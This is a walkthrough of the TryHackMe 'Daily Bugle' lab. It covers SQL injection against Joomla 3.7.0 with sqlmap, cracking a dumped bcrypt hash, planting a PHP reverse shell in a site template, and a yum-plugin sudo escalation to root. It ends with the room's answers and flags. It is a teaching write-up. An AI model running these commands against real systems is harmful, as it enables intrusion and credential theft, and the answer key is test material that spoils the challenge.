
# Daily Bugle CTF Walkthrough

Daily Bugle is a vulnerable server on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/dailybugle<br />
THM Difficulty: Hard<br />
My Difficulty: TBA<br />
Target IP: 10.10.217.112<br />
AttackBox IP: 10.10.222.48<br />
</i>

# Recon

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```shell
rustscan -a 10.10.217.112
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flags -sV -sC to find the service versions on the open port and to run Nmaps default scripts on the target.<br />
```
nmap -sV -p22,80,3306 10.10.217.112
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT2.png?raw=true)<br />
We have found multiple services running, let's have a closer look at these services.<br />

## HTTP Service Recon

We're going to start with looking at the HTTP Service, we can see it's running Apache 2.4.6 and PHP5.6.40 from the Nmap scan. I head over to the website below.
```shell
http://10.10.217.112/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT3.png?raw=true)<br />
Here we have our answer to the first question!<br />

Let's try having bruteforcing some directories with gobuster. I used the command below<br />
```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.217.112/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT4.png?raw=true)<br />
We are given plenty of results, the one that stood out to me was the /administrator directory, probably the login page for the administrators account? Let's have a look at it now<br />
```shell
http://10.10.217.112/administrator/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT5.png?raw=true)<br />
Our suspicion is confirmed, we know know that the web service is using Joomla!<br />

## Finding Joomla version with Metasploit

I wonder what version of Joomla they're using..? I know there's a module on Metasploit that does this so let's fire it up!<br />
```shell
msfconsole
```
Now that we have our metasploit loaded, let's look for the joomla version module.<br />
```shell
search joomla_version
use 0
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT6.png?raw=true)<br />
Now we have selected our module let's see what options it requires by using show options
```shell
show options
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT7.png?raw=true)<br />
As you can see from the options available, the only option required is RHOSTS so let's set that and run the scanner!
```shell
SET RHOSTS 10.10.217.112
exploit
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT8.png?raw=true)<br />
Success! We have found the version! This is also one of the answers to our questions. Let's see if this version has any vulnerabilities.

## Exploiting Joomla with Metasploit

We are now going to look for exploits in Joomla 3.7, let's continue in the Metasploit console and execute the folowing<br />
```shell
back
search joomla 3.7.0
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT9.png?raw=true)<br />
We can see one exploit available, let's select the exploit and run "info" for more information to make sure it's compatible with our version of Joomla.<br />
```shell
use 0
info
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT10.png?raw=true)<br />
As we can see from the results this is the correct exploit for our Joomla version. Let's try to explot Joomla! First we'll need to set the required options for the module. Then hit exploit like we did for the scanner!<br />
```shell
set RHOSTS 10.10.217.112
exploit
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT11.png?raw=true)<br />
Uh-oh something went wrong, let's have a look at the "info" command again, let's check out the exploit-db link they provide.<br />
```shell
https://www.exploit-db.com/exploits/42033
```
Let's check if we get an error message when trying to load the URL that's vulnerable. 
```shell
http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT12.png?raw=true)<br />
We get the error message which confirms it's vulnerable to SQL injection. Let's try using SQLmap instead they have the syntax for the command on the exploit-db page.<br />

## Exploiting Joomla with SQLi using SQLMap

We're going to open up a new terminal and try the below command.<br />
```shell
sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT13.png?raw=true)<br />
Success! We were able to get the database names, now let's dump the whole database and check the findings! We will use a similar command except replace --dbs with --dump-all. This will take a while so be patient.<br />

<b>This is not the best way to complete the CTF challenge, you could just dump the users instead of the whole database. To do this check SQLMaps syntax.</b><br />
```shell
sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
```
If you receive any messages or requests during the process just follow what I did below. If you understand what it's asking you, feel free to say no until you get the tables you want to dump.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT14.png?raw=true)<br />

### Just the #__users table and columns

In the example below I only pulled the table #__users and the columns, this is what you'll want to do if you want to skip dumping the whole database.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT15.png?raw=true)<br />

## Extracting data from the dumped database

SQLMap usually saves its output in the current users home directory, for example mine is /root/.sqlmap/output/10.10.217.112/dump/joomla<br />
Let's have a look at the __users column that we pulled. <br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT16.png?raw=true)<br />
Uh-oh that doesn't look right... There are a load of duplicates and the format has been ruined. At the top of the file we see the column names, let's try to work out which of the data is the user, password and e-mail.
```shell
id, name, email, params, username, password
```
Here's my guess for the username, password and e-mail.
- the e-mail is jonah@tryhackme.com
- the username is Jonah
- the password hash $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm<br />

## Cracking the hash we got previously with John

Let's try to crack the hash with John The Ripper! Paste the password hash into a new file and name it jonah.hash in your home directory, AttackBox would be /root/
```shell
john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt jonah.hash
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT17.png?raw=true)<br />
Success! Let John do it's thing, once you get the password answer the question and move to the next section.

Let's try the username and password we got previously on the administrator page of Joomla on the HTTP service.
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT18.png?raw=true)<br />

## Getting a remote shell

Success! Let's have a look around the Control Panel and see what's accessible to us. After looking around for a little while, 
I decide to try uploading a reverse shell... We could do this a few ways but I'll edit the current template and edit one of the PHP files.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT19.png?raw=true)<br />
As you can see from the image above, I have chosen to edit the index.php template to my PHP reverse shell. But first I'll need to set a listener on my AttackBox.<br />
```shell
nc -lvnp 8888
```
Now let's set the theme we edited to the default theme as shown below, then head over to the index.php file to initiate the connection.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT20.png?raw=true)<br />
Success! We now have a shell working as shown below, let's make our shell stable and then see if we can find the user flag!<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT21.png?raw=true)<br />
To make our shell stable we will use Python! Let's do this below<br />
```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

## System Recon

![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT22.png?raw=true)<br />
Now we have a stable shell, let's look for the users flag! Navigate over to the /home directory and use the ls command to list the directories/files.<br />
```shell
cd /home/
ls -la
```
Let's try getting into jjameson
```shell
cd /jjameson
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT23.png?raw=true)<br />
Well, looks like we'll need to get another account or escalate our privileges to get into their folder. Let's have a look around and see what we can find.<br />
After having around the system I decided to go back into the web directory to see if there were any interesting configuration files, there is!<br />
```shell
cd /usr/var/www/html
ls
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT24.png?raw=true)<br />
Can you see the interesting file? configuration.php stands out to me, let's have a look inside.
```shell
cat configuration.php
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT25.png?raw=true)<br />
Voila! Some interesting credentials... Maybe we could try to login to the root user with these credentials?<br />
```shell
su root
su jjameson
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT26.png?raw=true)<br />
I tried to login as root and that failed, but the password worked for jjameson! Let's check out the directory we couldn't access earlier.<br />
```shell
cd /home/jjameson
ls -la
```
Let's check out the user.txt<br />
```shell
cat user.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT27.png?raw=true)<br />
Success! Now we have the answer for the user flag, all that's left is to find root's flag. Let's continue looking around.

## Privilege Escalation

After looking around on the system for a while I couldn't find any other credentials, it looks like we're going to have to start looking for ways to escalate our privileges. Let's start with the kernel version.<br />
```shell
uname -a
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT28.png?raw=true)<br />
I couldn't find anything noteworthy on this kernel version, let's move on.<br />

Next I looked for files with the SUID bit
```shell
find / -perm -u=s -type f 2>/dev/null
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT29.png?raw=true)<br />
I couldn't see anything so I moved on.<br />

Now let's look if we can run anything as sudo.<br />
```
sudo -l
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT30.png?raw=true)<br />
Interesting... Let's check out GTFObins and see if we can use yum to get root privileges.
```
https://gtfobins.github.io/gtfobins/yum/
```
So it's possible to exploit yum by generating our own rpm package and installing it on the target. Let's do this now.<br />

### Using GTFObins to escalate our privileges

We're going to use method B "b) Spawn Interactive root shell by loading a custom plugin." Let's have a look at what we need to enter below<br />
<b>Note: If you don't understand what you're doing here, I've explained it at the bottom of the page.</b><br />
```shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```
If you have entered the commands correctly then you will now be a root user!<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT32.png?raw=true)<br />

### Collecting the last flag

Let's get the last flag and complete this room/box.
```shell
cd /root
ls
cat root.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT34.png?raw=true)<br />

### Extra Learning

- The privilege escalation technique we used makes use of runnning yum as sudo.<br />
- ```TF=$(mktemp -d)``` creates a temporary directory.<br />
- Afterwards, three files(x, y.conf, y.py) are created inside the temp directory by catting content into them.<br />
- ```EOF``` This is to designate End Of File(EOF) to stop catting input into a file.<br />
- ```sudo yum -c $TF/x --enableplugin=y``` simply executes a regular yum command, enabling the plugin "y" which is one of the just created files mentioned above.<br />
- ```def init_hook(conduit): os.execl('/bin/sh','/bin/sh')``` will then be executed giving you a shell as root since you executed it with sudo.<br />

## Questions & Answers

Question 1:<br />
**Access the web server, who robbed the bank?** Spiderman<br />

Question 2:<br />
**What is the Joomla version?** 3.7.0<br />

Question 3:<br />
**What is Jonah's cracked password?** spiderman123<br />

Question 4:<br />
**What is the user flag?** 27a260fe3cba712cfdedb1c86d80442e<br />

Question 5:<br />
**What is the root flag?** eec3d53292b1821868266858d7fa6f79<br />

### Farewell, I hope you all enjoyed this write-up!

